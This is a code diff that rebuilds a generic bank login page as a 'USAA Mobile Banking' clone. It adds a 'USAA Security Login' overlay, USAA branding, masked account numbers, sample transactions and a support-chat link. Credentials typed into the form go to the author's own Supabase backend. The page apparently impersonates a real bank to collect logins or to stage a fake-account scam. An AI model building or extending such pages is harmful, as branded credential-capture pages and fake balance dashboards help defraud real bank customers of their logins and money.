@@ -3,134 +3,211 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bank Dashboard - Auth</title>
-  <link rel="stylesheet" href="style.css">
-  <!-- Supabase JS Client library -->
+  <title>USAA Mobile Banking</title>
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+    body { background-color: #f4f6f8; color: #1a202c; padding-bottom: 70px; }
+    
+    /* Header Bar */
+    .header { background-color: #002649; color: white; padding: 20px 16px 30px; }
+    .top-nav { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+    .logo { font-weight: bold; font-size: 22px; letter-spacing: 1px; display: flex; align-items: center; gap: 6px; }
+    .welcome-text h1 { font-size: 24px; font-weight: 500; font-family: Georgia, serif; }
+    .welcome-text p { font-size: 13px; opacity: 0.8; margin-top: 4px; }
+    
+    /* Card Container */
+    .container { padding: 0 16px; margin-top: -15px; }
+    .card { background: white; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); margin-bottom: 20px; overflow: hidden; }
+    
+    /* Accounts Section */
+    .section-title { display: flex; justify-content: space-between; align-items: center; font-weight: 600; padding: 12px 4px; font-size: 16px; }
+    .section-title a { color: #0056b3; font-size: 14px; text-decoration: none; }
+    .account-row { display: flex; align-items: center; padding: 16px; border-bottom: 1px solid #edf2f7; }
+    .account-row:last-child { border-bottom: none; }
+    .account-icon { width: 40px; height: 40px; background: #002649; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 12px; font-size: 16px; }
+    .account-details { flex: 1; }
+    .account-name { font-weight: 700; font-size: 14px; color: #002649; text-transform: uppercase; }
+    .account-sub { font-size: 12px; color: #718096; }
+    .account-balance { text-align: right; }
+    .balance-amount { font-weight: 700; font-size: 15px; }
+    .balance-label { font-size: 11px; color: #718096; }
+    
+    /* Quick Actions */
+    .quick-actions { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; text-align: center; margin: 10px 0 20px; }
+    .action-btn { background: white; border-radius: 50%; width: 55px; height: 55px; display: flex; align-items: center; justify-content: center; margin: 0 auto 8px; border: 1px solid #e2e8f0; font-size: 18px; color: #002649; box-shadow: 0 2px 5px rgba(0,0,0,0.03); }
+    .action-label { font-size: 11px; font-weight: 600; color: #2d3748; line-height: 1.2; }
+    
+    /* Transactions */
+    .tx-row { display: flex; align-items: center; padding: 14px 16px; border-bottom: 1px solid #edf2f7; }
+    .tx-icon { width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 12px; font-size: 14px; }
+    .tx-details { flex: 1; }
+    .tx-title { font-weight: 600; font-size: 14px; }
+    .tx-date { font-size: 12px; color: #718096; }
+    .tx-amount { font-weight: 700; font-size: 14px; }
+    .positive { color: #2e7d32; }
+    .negative { color: #1a202c; }
+
+    /* Auth Overlay Form (Login / Register) */
+    .auth-overlay { position: fixed; inset: 0; background: rgba(0, 38, 73, 0.95); display: flex; align-items: center; justify-content: center; padding: 20px; z-index: 100; }
+    .auth-box { background: white; border-radius: 12px; padding: 24px; width: 100%; max-width: 360px; text-align: center; }
+    .auth-box input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; }
+    .auth-box button { width: 100%; padding: 12px; background: #002649; color: white; border: none; border-radius: 6px; font-size: 15px; font-weight: bold; margin-top: 10px; cursor: pointer; }
+    
+    /* Bottom Navigation Bar */
+    .bottom-nav { position: fixed; bottom: 0; left: 0; right: 0; background: white; border-top: 1px solid #e2e8f0; display: flex; justify-content: space-around; padding: 8px 0; }
+    .nav-item { text-align: center; color: #718096; text-decoration: none; font-size: 10px; font-weight: 600; }
+    .nav-item.active { color: #002649; }
+    .nav-item i { font-size: 18px; display: block; margin-bottom: 2px; }
+  </style>
 </head>
 <body>
 
-  <div class="auth-container">
-    <h2>Welcome to Your Bank</h2>
+  <!-- AUTH OVERLAY (Shows if user is not logged in) -->
+  <div id="auth-modal" class="auth-overlay">
+    <div class="auth-box">
+      <h2 style="color:#002649; margin-bottom: 10px;">USAA Security Login</h2>
+      <div id="auth-msg" style="font-size: 12px; color: red; margin-bottom: 8px;"></div>
+      
+      <form id="login-form">
+        <input type="email" id="email" placeholder="Email Address" required />
+        <input type="password" id="password" placeholder="Password" required />
+        <button type="submit">Log In</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- MAIN BANK DASHBOARD UI -->
+  <div class="header">
+    <div class="top-nav">
+      <i class="fa-regular fa-bell" style="font-size: 20px;"></i>
+      <div class="logo"><i class="fa-solid fa-eagle"></i> USAA</div>
+      <i class="fa-regular fa-user-circle" style="font-size: 22px;"></i>
+    </div>
+    <div class="welcome-text">
+      <h1 id="user-greeting">Good morning, Member</h1>
+      <p>Member since 2026</p>
+    </div>
+  </div>
+
+  <div class="container">
+    <!-- ACCOUNTS CARD -->
+    <div class="section-title">
+      <span>Accounts</span>
+      <a href="#">View all <i class="fa-solid fa-chevron-right"></i></a>
+    </div>
     
-    <!-- Tab Selector -->
-    <div class="tabs">
-      <button id="show-login-btn" class="active" onclick="showTab('login')">Login</button>
-      <button id="show-register-btn" onclick="showTab('register')">Register</button>
+    <div class="card">
+      <div class="account-row">
+        <div class="account-icon"><i class="fa-solid fa-wallet"></i></div>
+        <div class="account-details">
+          <div class="account-name">USAA CHECKING</div>
+          <div class="account-sub">•••• 1234</div>
+        </div>
+        <div class="account-balance">
+          <div class="balance-amount" id="checking-bal">$0.00</div>
+          <div class="balance-label">Available balance</div>
+        </div>
+      </div>
+
+      <div class="account-row">
+        <div class="account-icon"><i class="fa-solid fa-piggy-bank"></i></div>
+        <div class="account-details">
+          <div class="account-name">USAA SAVINGS</div>
+          <div class="account-sub">•••• 5678</div>
+        </div>
+        <div class="account-balance">
+          <div class="balance-amount" id="savings-bal">$0.00</div>
+          <div class="balance-label">Available balance</div>
+        </div>
+      </div>
     </div>
 
-    <!-- Feedback Message Display -->
-    <div id="message" class="message"></div>
+    <!-- QUICK ACTIONS -->
+    <div class="quick-actions">
+      <div>
+        <div class="action-btn" onclick="window.location.href='transaction.html'"><i class="fa-solid fa-arrow-right-arrow-left"></i></div>
+        <div class="action-label">Transfer Money</div>
+      </div>
+      <div>
+        <div class="action-btn"><i class="fa-solid fa-file-invoice-dollar"></i></div>
+        <div class="action-label">Pay Bills</div>
+      </div>
+      <div>
+        <div class="action-btn"><i class="fa-solid fa-money-check"></i></div>
+        <div class="action-label">Deposit Checks</div>
+      </div>
+      <div>
+        <div class="action-btn" onclick="window.location.href='message.html'"><i class="fa-solid fa-comments"></i></div>
+        <div class="action-label">Support Chat</div>
+      </div>
+    </div>
 
-    <!-- LOGIN FORM -->
-    <form id="login-form">
-      <h3>Login</h3>
-      <input type="email" id="login-email" placeholder="Email" required />
-      <input type="password" id="login-password" placeholder="Password" required />
-      <button type="submit">Log In</button>
-    </form>
+    <!-- TRANSACTIONS CARD -->
+    <div class="section-title">
+      <span>Transactions</span>
+      <a href="transaction.html">View all <i class="fa-solid fa-chevron-right"></i></a>
+    </div>
 
-    <!-- REGISTER FORM -->
-    <form id="register-form" style="display: none;">
-      <h3>Create Account</h3>
-      <input type="text" id="reg-name" placeholder="Full Name" required />
-      <input type="email" id="reg-email" placeholder="Email" required />
-      <input type="tel" id="reg-phone" placeholder="Phone Number (+1234567890)" />
-      <input type="password" id="reg-password" placeholder="Password" required />
-      <button type="submit">Sign Up</button>
-    </form>
+    <div class="card" id="tx-container">
+      <div class="tx-row">
+        <div class="tx-icon" style="background:#e2e8f0;"><i class="fa-solid fa-cart-shopping"></i></div>
+        <div class="tx-details">
+          <div class="tx-title">Walmart Supercenter</div>
+          <div class="tx-date">May 23, 2026</div>
+        </div>
+        <div class="tx-amount negative">-$54.97</div>
+      </div>
+      <div class="tx-row">
+        <div class="tx-icon" style="background:#e2f0d9; color:#2e7d32;"><i class="fa-solid fa-building-columns"></i></div>
+        <div class="tx-details">
+          <div class="tx-title">Direct Deposit</div>
+          <div class="tx-date">May 22, 2026</div>
+        </div>
+        <div class="tx-amount positive">+$2,850.00</div>
+      </div>
+    </div>
+  </div>
 
-    <!-- VERIFICATION CODE FORM (Shows when phone verification is triggered) -->
-    <form id="verify-form" style="display: none;">
-      <h3>Enter Verification Code</h3>
-      <p>Please enter the OTP code sent to your phone/email.</p>
-      <input type="text" id="verify-code" placeholder="6-digit code" required />
-      <button type="submit">Verify Code</button>
-    </form>
+  <!-- BOTTOM NAVIGATION -->
+  <div class="bottom-nav">
+    <a href="index.html" class="nav-item active"><i class="fa-solid fa-house"></i>Home</a>
+    <a href="transaction.html" class="nav-item"><i class="fa-solid fa-credit-card"></i>Banking</a>
+    <a href="message.html" class="nav-item"><i class="fa-solid fa-comment-dots"></i>Support</a>
+    <a href="#" class="nav-item"><i class="fa-solid fa-bars"></i>More</a>
   </div>
 
   <script>
-    // 1. Initialize Supabase Client
-    // Replace these placeholder strings with your actual Vercel/Supabase values if needed locally, 
-    // or set up window env variables when deploying.
-    const SUPABASE_URL = "YOUR_SUPABASE_PROJECT_URL"; 
+    const SUPABASE_URL = "YOUR_SUPABASE_PROJECT_URL";
     const SUPABASE_ANON_KEY = "sb_publishable_2VBan5zlHsacQ4fvsBiBPQ_78oaUVth";
-    
     const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-    // UI Helper: Toggle Forms
-    function showTab(tab) {
-      document.getElementById('message').innerText = '';
-      if (tab === 'login') {
-        document.getElementById('login-form').style.display = 'block';
-        document.getElementById('register-form').style.display = 'none';
-        document.getElementById('verify-form').style.display = 'none';
-        document.getElementById('show-login-btn').classList.add('active');
-        document.getElementById('show-register-btn').classList.remove('active');
+    // Login logic
+    document.getElementById('login-form').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      const msg = document.getElementById('auth-msg');
+
+      const { data, error } = await supabase.auth.signInWithPassword({ email, password });
+      if (error) {
+        msg.innerText = error.message;
       } else {
-        document.getElementById('login-form').style.display = 'none';
-        document.getElementById('register-form').style.display = 'block';
-        document.getElementById('verify-form').style.display = 'none';
-        document.getElementById('show-register-btn').classList.add('active');
-        document.getElementById('show-login-btn').classList.remove('active');
+        document.getElementById('auth-modal').style.display = 'none';
+        loadUserData();
+      }
+    });
+
+    async function loadUserData() {
+      const { data: { user } } = await supabase.auth.getUser();
+      if (user) {
+        document.getElementById('auth-modal').style.display = 'none';
+        document.getElementById('user-greeting').innerText = "Good morning, " + (user.user_metadata.full_name || 'Member');
       }
     }
 
-    // 2. Handle User Registration
-    document.getElementById('register-form').addEventListener('submit', async (e) => {
-      e.preventDefault();
-      const name = document.getElementById('reg-name').value;
-      const email = document.getElementById('reg-email').value;
-      const phone = document.getElementById('reg-phone').value;
-      const password = document.getElementById('reg-password').value;
-      const msg = document.getElementById('message');
-
-      msg.innerText = "Creating account...";
-
-      // Sign up via Supabase Auth
-      const { data, error } = await supabase.auth.signUp({
-        email: email,
-        password: password,
-        options: {
-          data: { full_name: name, phone_number: phone }
-        }
-      });
-
-      if (error) {
-        msg.innerText = "Error: " + error.message;
-        msg.style.color = "red";
-      } else {
-        msg.innerText = "Registration successful! Check your email for verification link.";
-        msg.style.color = "green";
-      }
-    });
-
-    // 3. Handle User Login
-    document.getElementById('login-form').addEventListener('submit', async (e) => {
-      e.preventDefault();
-      const email = document.getElementById('login-email').value;
-      const password = document.getElementById('login-password').value;
-      const msg = document.getElementById('message');
-
-      msg.innerText = "Logging in...";
-
-      const { data, error } = await supabase.auth.signInWithPassword({
-        email: email,
-        password: password
-      });
-
-      if (error) {
-        msg.innerText = "Login failed: " + error.message;
-        msg.style.color = "red";
-      } else {
-        msg.innerText = "Login successful! Redirecting...";
-        msg.style.color = "green";
-        // Store user session token and redirect to Dashboard
-        setTimeout(() => {
-          window.location.href = "dashboard.html";
-        }, 1000);
-      }
-    });
+    loadUserData();
   </script>
 </body>
 </html>
